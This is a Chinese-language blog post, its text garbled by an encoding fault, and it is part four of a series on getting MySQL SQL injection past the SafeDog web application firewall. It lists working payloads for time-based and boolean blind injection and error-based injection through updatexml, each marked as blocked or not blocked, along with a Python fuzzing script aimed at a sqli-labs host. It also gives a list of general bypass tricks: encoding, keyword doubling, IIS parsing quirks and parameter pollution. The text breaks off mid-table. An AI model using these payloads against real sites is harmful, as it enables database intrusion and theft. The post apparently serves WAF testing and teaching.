<!DOCTYPE html><html lang="zh-cn"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no"><meta name="format-detection" content="telephone=no"><meta name="format-detection" content="email=no"><meta name="description"><meta name="keywords" content="Hexo, Gruntjs, Nodejs, Reactjs, Vuejs"><title>ğŸ’‰ SQLi_BYPASS_for_mysql Vol.4 - Naykcin's Page</title><link rel="stylesheet" href="/css/main_style.min.css"><link rel="icon" href="/logo.png"></head><body><input id="navi" type="checkbox"><ul class="main-navication"><li><a href="/"><span>Home</span></a></li><li><a href="https://github.com"><span>Github</span></a></li><li><a href="https://www.v2ex.com/"><span>V2EX</span></a></li></ul><div class="wrapper" id="wrap"><div class="post-header"><label class="navi-button light" for="navi">MENU</label><img class="background" src="http://47.95.140.43/typora_pic/background.JPG"><div class="post-title"><h1 class="title">ğŸ’‰ SQLi_BYPASS_for_mysql Vol.4</h1><ul class="meta"><li><i class="icon icon-author"></i>Naykcin</li><li><i class="icon icon-clock"></i>23 Minutes</li><li><i class="icon icon-calendar"></i>January 9, 2020</li></ul></div></div><div class="article-content" style="max-width:800px"><h2 id="ğŸ’‰-SQLi-BYPASS-for-mysql-Vol-4"><a href="#ğŸ’‰-SQLi-BYPASS-for-mysql-Vol-4" class="headerlink" title="ğŸ’‰ SQLi_BYPASS_for_mysql Vol.4"></a><center>ğŸ’‰ <em>SQLi_BYPASS_for_mysql Vol.4</em></center></h2><h3 id="ç›®å½•"><a href="#ç›®å½•" class="headerlink" title="ç›®å½•"></a>ç›®å½•</h3><ul>
<li>ç›²æ³¨ <em>BYPASS</em><ul>
<li>æ—¶é—´ç›²æ³¨ <em>BYPASS</em></li>
<li>å¸ƒå°”ç›²æ³¨ <em>BYPASS</em></li>
</ul>
</li>
<li>æŠ¥é”™æ³¨å…¥ <em>BYPASS</em></li>
<li><em>BYPASS</em> æ€è·¯<ul>
<li>Tricks</li>
</ul>
</li>
<li>åè¯</li>
</ul>
<h3 id="ğŸ™ï¸-0x00-å‰è¨€"><a href="#ğŸ™ï¸-0x00-å‰è¨€" class="headerlink" title="ğŸ™ï¸ 0x00 å‰è¨€"></a>ğŸ™ï¸ 0x00 å‰è¨€</h3><p>vol.3 ä¸»è¦è®°å½•äº† union select BYPASSï¼Œè¿™é‡Œæ¥ç€ä¸Šéƒ¨åˆ†ä»ç›²æ³¨å¼€å§‹ã€‚</p>
<h3 id="0x22-ç›²æ³¨-BYPASS"><a href="#0x22-ç›²æ³¨-BYPASS" class="headerlink" title="0x22 ç›²æ³¨ BYPASS"></a>0x22 ç›²æ³¨ <em>BYPASS</em></h3><h4 id="æ—¶é—´ç›²æ³¨-BYPASS"><a href="#æ—¶é—´ç›²æ³¨-BYPASS" class="headerlink" title="æ—¶é—´ç›²æ³¨ BYPASS"></a>æ—¶é—´ç›²æ³¨ <em>BYPASS</em></h4><p>ä»æ—¶é—´ç›²æ³¨å…¥æ‰‹ï¼Œç›¸æ¯”å¸ƒå°”ç›²æ³¨è¦æ›´çµæ´»ä¸€äº›ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?id=1 if(1=1,1,0)		ä¸æ‹¦æˆª</span><br><span class="line">?id=a if(1=1,1,0)		ä¸æ‹¦æˆª</span><br><span class="line">?id=1 and if(1=1,1,0) 	æ‹¦æˆª</span><br><span class="line">?id=1 | if(1=1,1,0)	ä¸æ‹¦æˆª</span><br><span class="line">?id=1 || if(1=1,1,0) æ‹¦æˆª</span><br><span class="line">?id=1 &amp;&amp; if(1=1,1,0) æ‹¦æˆª</span><br><span class="line">?id=1 /*!and*/ if(1=1,1,0) æ‹¦æˆª</span><br><span class="line">?id=1 /*!11440and*/ if(1=1,1,0) ä¸æ‹¦æˆª</span><br><span class="line">?id=1 andaif(1=1,1,0) ä¸æ‹¦æˆª</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹å‡º <code>if()</code> å‰é¢å¦‚æœæœ‰è¿æ¥è¯ï¼Œå®‰å…¨ç‹—æ˜¯ä¼šæ‹¦æˆªçš„ï¼Œåä¹‹åˆ™ä¸æ‹¦ã€‚åˆ©ç”¨ä¸Šä¸€ç« çš„æ–¹æ³•å†…è”æ³¨å…¥æ˜¯å¯ä»¥ BYPASS çš„ï¼Œè¿™æ ·å¯ä»¥ç›´æ¥è¿›è¡Œåé¢çš„æ³¨å…¥ï¼Œé™¤äº†è¿™ä¸ªæ–¹æ³•æˆ‘ä»¬å†å°è¯•ä¸€ä¸‹å…¶ä»–çš„ç»•è¿‡æ–¹å¼ã€‚</p>
<p>âš ï¸ <strong>æ‹“å±•</strong></p>
<p><code>and!!!1=1</code>ï¼Œand åé¢å¯ä»¥æ¥ä¸Šå¥‡æ•°ä¸ªç‰¹æ®Šçš„å­—ç¬¦ï¼ŒåŒ…æ‹¬ä½†ä¸é™äº <code>! ~ &amp; -</code>ï¼Œè¿™æ ·å°±å¯ä»¥æ„é€  payload äº†ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and!!!if((substr((select hex(user/**/(/*!*/))),1,8)=/*!&apos;726F6F74&apos;*/),sleep/**/(/*!5*/),0) -- +</span><br></pre></td></tr></table></figure>

<p>âš ï¸ <strong>æ³¨æ„</strong></p>
<p>è¿™é‡Œåœ¨å¯¹ <code>user()</code> çš„ç»“æœè¿›è¡Œåå…­è¿›åˆ¶ç¼–ç çš„æ—¶å€™éœ€è¦æ³¨æ„ hex å‡½æ•°çš„æ„é€ ä½ç½®ï¼š</p>
<p><img src="http://47.95.140.43/tu/sqli_bypass4/Screenshot%202020-02-23%20%E4%B8%8B%E5%8D%884.40.06.jpg" alt="Screenshot 2020-02-23 ä¸‹åˆ4.40.06"></p>
<p>å¦å¤–ï¼Œå®‰å…¨ç‹—ä¼¼ä¹å¯¹ <code>&#39;æ•°å­—å‹&#39;</code> åšäº†è¿‡æ»¤ï¼Œæ‰€ä»¥è¿™é‡Œä¹Ÿéœ€è¦ç®€å•çš„ç»•è¿‡ã€‚åº”ç”¨è¿™ä¸ª payloadï¼Œå¯ä»¥åˆ¤æ–­ <code>user()</code> åå…­è¿›åˆ¶ç¼–ç çš„å‰å…«ä½ç­‰äº <code>726f6f74</code>ï¼Œè§£ç ç­‰äº <code>root</code>ï¼Œå»¶æ—¶ 5 ç§’è¿”å›é¡µé¢ï¼ŒBYPASS æˆåŠŸã€‚</p>
<p><img src="http://47.95.140.43/tu/sqli_bypass4/Screenshot%202020-02-23%20%E4%B8%8B%E5%8D%885.11.40.jpg" alt="Screenshot 2020-02-23 ä¸‹åˆ5.11.40"></p>
<h4 id="å¸ƒå°”ç›²æ³¨-BYPASS"><a href="#å¸ƒå°”ç›²æ³¨-BYPASS" class="headerlink" title="å¸ƒå°”ç›²æ³¨ BYPASS"></a>å¸ƒå°”ç›²æ³¨ <em>BYPASS</em></h4><p>å¸ƒå°”æ³¨å…¥ç»•è¿‡ç›¸å¯¹æ¥è¯´æ˜¯æœ€ç®€å•çš„ï¼Œå› ä¸ºå¯ä»¥ä¸ä½¿ç”¨æ¡ä»¶è¯­å¥ï¼Œå°‘äº†ä¸€ä¸ªç»•è¿‡ç‚¹ã€‚è¿™é‡Œä¹Ÿè®°å½•ä¸€ä¸‹æ€è·¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and &apos;a&apos; æ‹¦æˆª</span><br><span class="line">?id=1 and a		ä¸æ‹¦æˆª</span><br><span class="line">?id=1 and!!!a ä¸æ‹¦æˆª</span><br><span class="line"></span><br><span class="line">ç„¶åé’ˆå¯¹ ?id=1 and!!!substr((select user()),1,4)=&apos;root&apos; æ„é€  payload ä¸ºï¼š</span><br><span class="line"></span><br><span class="line">?id=1 and!!!substr((select unhex(hex(user/**/(/*!*/)))),1,4)=/*!&apos;root&apos;*/ -- +</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸ BYPASSï¼š</p>
<p><img src="http://47.95.140.43/tu/sqli_bypass4/Screenshot%202020-02-23%20%E4%B8%8B%E5%8D%885.26.31.jpg" alt="Screenshot 2020-02-23 ä¸‹åˆ5.26.31"></p>
<p>æœ€åå…¶å®å‘ç°å®‰å…¨ç‹—å¯¹äºå¸ƒå°”ç›²æ³¨çš„è¿‡æ»¤å…¶å®å¾ˆå·®ï¼Œæµ‹è¯•ä»¥ä¸‹ payload ä¹Ÿæ˜¯å¯ä»¥ç»•è¿‡çš„ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and!!!substr((select unhex(hex(user/**/(/*!*/)))),1,4)=/*!&apos;root&apos;*/ -- + BYPASS æˆåŠŸ</span><br><span class="line"></span><br><span class="line">?id=1 /*!and*/ substr((select unhex(hex(user/**/(/*!*/)))),1,4)=/*!&apos;root&apos;*/ -- + æ‹¦æˆª</span><br><span class="line"></span><br><span class="line">// å°† and æ¢æˆ &amp;&amp;</span><br><span class="line">?id=1 %26%26 substr((select unhex(hex(user/**/(/*!*/)))),1,4)=/*!&apos;root&apos;*/ -- + æ‹¦æˆª</span><br><span class="line"></span><br><span class="line">?id=1&apos; /*!%26%26*/ substr((select unhex(hex(user/**/(/*!*/)))),1,4)=/*!&apos;root&apos;*/ -- + ä¸æ‹¦æˆªï¼ŒæˆåŠŸ BYPASS</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸ BYPASSï¼š</p>
<p><img src="http://47.95.140.43/tu/sqli_bypass4/Screenshot%202020-02-23%20%E4%B8%8B%E5%8D%885.38.45.jpg" alt="Screenshot 2020-02-23 ä¸‹åˆ5.38.45"></p>
<p>ç›²æ³¨éƒ¨åˆ†ç»“æŸï¼Œæ€»ä¹‹å°±æ˜¯ä¸€å¥è¯ï¼šä¸æ–­åœ° fuzz æ¥æ„é€  payloadã€‚</p>
<h3 id="0x23-æŠ¥é”™æ³¨å…¥-BYPASS"><a href="#0x23-æŠ¥é”™æ³¨å…¥-BYPASS" class="headerlink" title="0x23 æŠ¥é”™æ³¨å…¥ BYPASS"></a>0x23 æŠ¥é”™æ³¨å…¥ <em>BYPASS</em></h3><p>æˆ‘ä»¬å·²ç»æµ‹è¯•äº†è”åˆæ³¨å…¥ BYPASSã€ç›²æ³¨ BYPASSï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹æŠ¥é”™æ³¨å…¥ BYPASSï¼Œè¿˜æ˜¯åˆ©ç”¨ <code>updatexml()</code> å‡½æ•°ã€‚</p>
<p>é¦–å…ˆæˆ‘ä»¬å†æ¬¡å›é¡¾ä¸€ä¸‹ <code>updatexml()</code> è¿™ä¸ªå‡½æ•°ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">updatexml() å‡½æ•°æœ‰ä¸‰ä¸ªå‚æ•°ï¼šupdatexml(xml_document,xpath_string,new_value)ã€‚</span><br><span class="line"></span><br><span class="line">ç¬¬ä¸€ä¸ªå‚æ•°ï¼šxml_document æ˜¯ string æ ¼å¼ï¼Œä¸º xml æ–‡æ¡£å¯¹è±¡çš„åç§°ã€‚</span><br><span class="line"></span><br><span class="line">ç¬¬äºŒä¸ªå‚æ•°ï¼šxpath_stringï¼Œxpath æ ¼å¼çš„å­—ç¬¦ä¸²ã€‚</span><br><span class="line"></span><br><span class="line">ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_value æ˜¯ string æ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®ã€‚</span><br><span class="line"></span><br><span class="line">è¯¥å‡½æ•°çš„ä½œç”¨ï¼šæ”¹å˜æ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹çš„å€¼ã€‚</span><br></pre></td></tr></table></figure>

<p>å‰å‡ ç« æˆ‘ä»¬ç”¨æ¥æŠ¥é”™æ³¨å…¥çš„ payload ä¸ºï¼š<code>updatexml(1,concat(0x7e,(select @@version),0x7e),1)</code>ï¼Œå…¶ä¸­ <code>concat()</code> å‡½æ•°çš„ä½œç”¨æ˜¯å°†å‡½æ•°å†…çš„ç»“æœè¿æ¥æˆå­—ç¬¦ä¸²ï¼Œå› æ­¤ä¸ç¬¦åˆ xpath_string çš„æ ¼å¼ï¼Œä»è€Œå‡ºç°æ ¼å¼é”™è¯¯ï¼Œè¾¾åˆ°æŠ¥é”™æ³¨å…¥çš„ç›®çš„ã€‚</p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬å¼€å§‹ fuzzï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?id=updatexml ä¸æ‹¦æˆª</span><br><span class="line">?id=updatexml() ä¸æ‹¦æˆª</span><br><span class="line">?id=updatexml(1,2,3) æ‹¦æˆª</span><br><span class="line">?id=updatexml(1,2,) ä¸æ‹¦æˆª</span><br><span class="line">?id=updatexml(1,2,!) æ‹¦æˆª</span><br><span class="line">?id=updatexml(1,2,hex()) æ‹¦æˆª</span><br><span class="line">?id=1 and updatexml(1,2,) ä¸æ‹¦æˆª</span><br><span class="line">?id=1 and updatexml(1,2,3) æ‹¦æˆª</span><br></pre></td></tr></table></figure>

<p>ç»è¿‡ fuzz æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œå®‰å…¨ç‹—ä¼šåˆ¤æ–­ <code>updatexml()</code> å‡½æ•°çš„å®Œæ•´æ€§ï¼Œå½“é€—å·åˆ†éš”å‡ºç°ä¸‰ä¸ªå­—ç¬¦æ—¶ï¼Œå°±ä¼šæ‹¦æˆªï¼Œæœ‰äº›ä¸ªåˆ«çš„ç‰¹æ®Šå­—ç¬¦ä¹Ÿæ²¡æœ‰è¿‡æ»¤ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬åœ¨æ‹¬å·é‡Œé¢æ„é€  payload çš„éš¾åº¦æ¯”è¾ƒå¤§ï¼Œæ¢ä¸€ç§æ€è·¯ï¼Œæˆ‘ä»¬å¯ä»¥ç»™ <code>updataxml()</code> å‡½æ•°å¤–é¢å¥—ä¸€ä¸ªå¤–å¥—ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=/*!14400updatexml*/(1,1,1) ä¸æ‹¦æˆª</span><br><span class="line">?id=/*updatexml*/(1,1,1) ä¸æ‹¦æˆª</span><br><span class="line">?id=/*!updatexml*/(1,1,1) æ‹¦æˆª</span><br></pre></td></tr></table></figure>

<p>ç»•è¿‡ <code>updatexml()</code> å‡½æ•°ä¹‹åï¼Œç»§ç»­ fuzzï¼Œæˆ‘ä»¬åœ¨å‰é¢åŠ ä¸ªè¿ç®—ç¬¦å·ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and /*!updatexml*/(1,(select hex(user/**/(/**/))),1) -- + æ‹¦æˆª</span><br><span class="line"></span><br><span class="line">?id=1&apos; or /*!updatexml*/(1,(select hex(user/**/(/**/))),1) -- + æ‹¦æˆª</span><br><span class="line"></span><br><span class="line">?id=1&apos; /*!and*/ /*!updatexml*/(1,(select hex(user/**/(/**/))),1) -- + æ‹¦æˆª</span><br><span class="line"></span><br><span class="line">?id=1&apos; /*!%26%26*/ /*!updatexml*/(1,(select hex(user/**/(/**/))),1) -- + ä¸æ‹¦æˆªï¼ŒæˆåŠŸæŠ¥é”™</span><br><span class="line"></span><br><span class="line">?id=1&apos; /*!||*/ /*!11440updatexml*/(1,(select hex(user())),1) -- + ä¸æ‹¦æˆª</span><br><span class="line"></span><br><span class="line">?id=1&apos; /*!xor*/ /*!11440updatexml*/(1,select hex(user/**/(/**/)),1) -- + ä¸æ‹¦æˆª</span><br><span class="line"></span><br><span class="line">?id=1&apos; | /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) -- + ä¸æ‹¦æˆª</span><br><span class="line"></span><br><span class="line">?id=1&apos; xor /*!11440updatexml*/(1,(select hex(user/**/(/**/))),1) -- + ä¸æ‹¦æˆª</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…åˆ©ç”¨åå¼•å· ` æ¥åŒ…è£¹ <code>updatexml()</code>ï¼ŒASCII 96ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.1.1.1/?id=1&apos; and `updatexml`(1,(select hex(user/**/(/**/))),1) -- +</span><br></pre></td></tr></table></figure>

<p>å°è¯•å†™ä¸ªå°è„šæœ¬æ¥æµ‹è¯•ä¸€ä¸‹æ˜¯å¦è¿˜æœ‰åˆ«çš„å¯åŒ…å«çš„ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">177</span>):</span><br><span class="line">  url = <span class="string">r"http://172.16.232.206/sqli-labs/Less-1/?id=1%27%20&#123;fuzz&#125;updatexml&#123;fuzz&#125;(1,(select hex(user/**/(/**/))),1)%20--%20+"</span>.format(fuzz=urllib.quote(chr(i)))</span><br><span class="line">  req = requests.get(url)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">"F6F7"</span> <span class="keyword">in</span> req.text:</span><br><span class="line">    <span class="keyword">print</span> len(req.text),i,urllib.quote(chr(i))</span><br></pre></td></tr></table></figure>

<p>æŠ¥é”™æ³¨å…¥åˆ°è¿™é‡Œç»“æŸã€‚æœ‰æ—¶å€™å¯èƒ½å‘ç°æŸä¸ªæ–¹æ³•å¯ç»•è¿‡ï¼Œä¹Ÿè®¸è¿™ä¸ªæ–¹æ³•å…¨å±€æœ‰æ•ˆï¼Œè¿™æ ·å°±å¯ä»¥å¾ˆå¤§ç¨‹åº¦ä¸Šæé«˜æ•ˆç‡ã€‚</p>
<h3 id="0x24-BYPASS-æ€è·¯"><a href="#0x24-BYPASS-æ€è·¯" class="headerlink" title="0x24 BYPASS æ€è·¯"></a>0x24 <em>BYPASS</em> æ€è·¯</h3><p>å…¶å®å¯¹äº WAF çš„ç»•è¿‡æ— éå°±æ˜¯åˆ©ç”¨ WEB ç¨‹åºçš„ç¼ºé™·ï¼ˆè¿‡æ»¤ä¸ä¸¥æ ¼ï¼‰ã€å®¹å™¨ç‰¹æ€§ã€ç½‘ç»œåè®®ã€æ•°æ®åº“ç‰¹æ€§æ¥ç»„åˆåˆ©ç”¨ç»•è¿‡ï¼Œä»ç”¨æˆ·å‘å‡ºè¯·æ±‚åˆ°æ•°æ®åº“çš„æ¯ä¸€ç‚¹ï¼Œæ¥å¯»æ‰¾çªç ´å£ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªä¸æ–­ fuzz çš„è¿‡ç¨‹ã€‚</p>
<h4 id="Tricks"><a href="#Tricks" class="headerlink" title="Tricks"></a>Tricks</h4><ul>
<li>HTTP åè®®åˆ©ç”¨</li>
<li>å¤§å°å†™æ··æ·†</li>
<li>æ›¿æ¢</li>
<li>åˆ©ç”¨ç‰¹æ®Šå­—ç¬¦</li>
<li>ç¼–ç ç»•è¿‡</li>
<li>ç­‰ä»·æ›¿æ¢</li>
<li>ä¸­é—´ä»¶ç‰¹æ€§</li>
<li>ç™½åå•</li>
<li>ç¼“å†²æº¢å‡ºï¼ˆè¿™ä¸ªæˆ‘ä¹Ÿä¸æ‡‚ï¼Œå¥½é«˜ç«¯çš„æ ·å­ï¼‰</li>
</ul>
<p>ç­‰ç­‰ç­‰ç­‰ï¼Œåªè¦ä½ èƒ½æƒ³å¾—åˆ°ã€‚</p>
<h4 id="HTTP-åè®®åˆ©ç”¨"><a href="#HTTP-åè®®åˆ©ç”¨" class="headerlink" title="HTTP åè®®åˆ©ç”¨"></a>HTTP åè®®åˆ©ç”¨</h4><p>HTTP åè®®ä¸­æœ‰å¾ˆå¤šåŠŸèƒ½ï¼Œä¸€èˆ¬ç”¨åˆ°çš„æ˜¯ URL ç¼–ç ã€‚ä¹Ÿæœ‰æ•°æ®åŒ…åˆ†å—ä¼ å…¥æ¥ BYPASS çš„æ€è·¯ï¼Œä½†æ˜¯å¯èƒ½æ¯”è¾ƒå¤æ‚ï¼š</p>
<ol>
<li>æ„é€ ç•¸å½¢æ•°æ®åŒ…</li>
<li>ç¼–ç </li>
<li>åˆ†å—</li>
<li>æ•°æ®åŒ…æº¢å‡º</li>
</ol>
<p>HTTP åè®®æ˜¯æœ‰ä¸€å®šçš„å®¹é”™æ€§çš„ï¼Œé€šè¿‡è¿™ä¸ªå®¹é”™æ€§å»ç»•è¿‡ä¸Šä¼ ã€‚ç¼–ç ç»•è¿‡çš„åŸç†ä¹Ÿå·®ä¸å¤šï¼Œå› ä¸ºä¸€èˆ¬æ˜¯ç¨‹åºå»è§£ç ï¼Œä¸€èˆ¬ WAF ä¸åšè§£ç çš„å·¥ä½œï¼ˆå› ä¸ºå¯èƒ½ä¼šé™ä½æ•ˆç‡ï¼‰ï¼Œæ‰€ä»¥æ— æ³•è¯†åˆ«ã€‚æ•°æ®åŒ…æº¢å‡ºåˆ™æ˜¯å› ä¸ºæ•°æ®åŒ…è¿‡å¤§ waf è‡ªåŠ¨ä¸¢å¼ƒè€Œä¸è¯†åˆ«ã€‚</p>
<h4 id="å¤§å°å†™æ··æ·†"><a href="#å¤§å°å†™æ··æ·†" class="headerlink" title="å¤§å°å†™æ··æ·†"></a>å¤§å°å†™æ··æ·†</h4><p>å¤§å°å†™æ··æ·†ä¸€èˆ¬å¯ç”¨æ¥ç»•è¿‡ä¸€äº›ç®€å•çš„æ­£åˆ™ï¼Œç°åœ¨ä¼¼ä¹å¾ˆå°‘å¯ä»¥ BYPASS äº†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UnIon SeLecT</span><br></pre></td></tr></table></figure>

<h4 id="æ›¿æ¢"><a href="#æ›¿æ¢" class="headerlink" title="æ›¿æ¢"></a>æ›¿æ¢</h4><p>æœ‰æ—¶ WAF çš„æ­£åˆ™å¯èƒ½ä¼šå°†æ•°æ®åŒ…ä¸­çš„å…³é”®è¯ç»™å‰”é™¤ï¼Œä½†æ˜¯æ²¡æœ‰è¿›è¡Œå¤šæ¬¡çš„åŒ¹é…ï¼Œæ‰€ä»¥å¯èƒ½å¯¼è‡´ BYPASSï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ununionion selselectect</span><br><span class="line">un/**/ion sel/**/ect</span><br></pre></td></tr></table></figure>

<h4 id="ç‰¹æ®Šå­—ç¬¦"><a href="#ç‰¹æ®Šå­—ç¬¦" class="headerlink" title="ç‰¹æ®Šå­—ç¬¦"></a>ç‰¹æ®Šå­—ç¬¦</h4><p>è¿™ä¸€èˆ¬æ˜¯ç”±äºæ•°æ®åº“çš„ç‰¹æ€§ï¼Œåˆ©ç”¨æ•°æ®åº“å¯ä»¥ä½¿ç”¨å¤šç§ç¬¦å·ã€è¿ç®—ç¬¦æ¥ç»•è¿‡ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">`updatexml`(1,1,1)</span><br><span class="line">and!!!1=1</span><br><span class="line">/**/</span><br><span class="line">/*!50000*/</span><br></pre></td></tr></table></figure>

<h4 id="åˆ©ç”¨ç¼–ç "><a href="#åˆ©ç”¨ç¼–ç " class="headerlink" title="åˆ©ç”¨ç¼–ç "></a>åˆ©ç”¨ç¼–ç </h4><p>å…¶å®å’Œ HTTP åè®®å·®ä¸å¤šï¼Œè¿™é‡Œæ˜¯æŒ‡å¤šé‡ç¼–ç ã€‚URL ç¼–ç ä¼šè‡ªå·±è§£ç ä¸€æ¬¡ï¼Œä½†æ˜¯æœ‰çš„ç¨‹åºå¯å¤šæ¬¡è§£ç ï¼Œè¿˜æœ‰çš„ç¨‹åºæ˜¯æ”¯æŒ base64 ç¼–ç çš„ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥æ„é€  pyloadã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// url ç¼–ç ä¸¤æ¬¡</span><br><span class="line">=  ğŸ‘‰ğŸ»  %3d  ğŸ‘‰ğŸ»  %25%33%44</span><br><span class="line"></span><br><span class="line">// base64 ç¼–ç </span><br><span class="line">and 1=1  ğŸ‘‰ğŸ»  YW5kIDE9MQ==</span><br></pre></td></tr></table></figure>

<h4 id="ç­‰ä»·æ›¿æ¢"><a href="#ç­‰ä»·æ›¿æ¢" class="headerlink" title="ç­‰ä»·æ›¿æ¢"></a>ç­‰ä»·æ›¿æ¢</h4><p>å¾ˆå¥½ç†è§£ï¼Œmysql æœ‰å¾ˆå¤šå‡½æ•°ï¼ŒæŸä¸ªå‡½æ•°å¦‚æœè¢«è¿‡æ»¤å¯ä»¥æŸ¥æ‰¾æ‰‹å†Œï¼Œåˆ©ç”¨è¿”å›ç»“æœå·®ä¸å¤šçš„å‡½æ•°æ¥æ›¿æ¢ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">substr((select user()),1,1)</span><br><span class="line">substring((select user()),1,1)</span><br><span class="line">Left((select version()),1)</span><br></pre></td></tr></table></figure>

<h4 id="ä¸­é—´ä»¶ç‰¹æ€§"><a href="#ä¸­é—´ä»¶ç‰¹æ€§" class="headerlink" title="ä¸­é—´ä»¶ç‰¹æ€§"></a>ä¸­é—´ä»¶ç‰¹æ€§</h4><ol>
<li><p><strong><em>IIS</em></strong></p>
<p>æœ‰æ—¶å€™å®¹å™¨çš„ç‰¹æ€§ä¼šç»™æˆ‘ä»¬ BYPASS å¸¦æ¥å¸®åŠ©ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// IIS+ASP çš„ % ç‰¹æ€§</span><br><span class="line">å½“ä¼ å…¥çš„ select è¢« % åˆ†å‰²æˆ s%e%l%e%c%t æ—¶ï¼Œè§£æå‡ºæ¥è¿˜æ˜¯ select</span><br><span class="line"></span><br><span class="line">// IIS+ASP çš„ unicode ç‰¹æ€§</span><br><span class="line">IIS æ”¯æŒ unicode è§£æï¼Œä¼ å…¥ s%u0065lect ä¼šè¢«è§£æä¸º select</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><em>hpp</em></strong></p>
<p>hpp å‚æ•°æ±¡æŸ“ï¼Œä¹‹å‰ BYPASS Safedog æ—¶ç”¨åˆ°è¿‡ã€‚ä¸åŒä¸­é—´ä»¶å¯¹æˆ‘ä»¬ä¼ å…¥çš„å€¼è§£æé¡ºåºä¹Ÿæ˜¯ä¸åŒçš„ï¼Œè¿™ä¸€ç‚¹ä¹Ÿå¯ä»¥åˆ©ç”¨ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// PHP+Apache</span><br><span class="line">&amp;id=1&amp;id=2 Apache   åªè§£ææœ€åä¸€ä¸ª</span><br><span class="line"></span><br><span class="line">    +------------------------------------------------------------------+</span><br><span class="line">    | Web 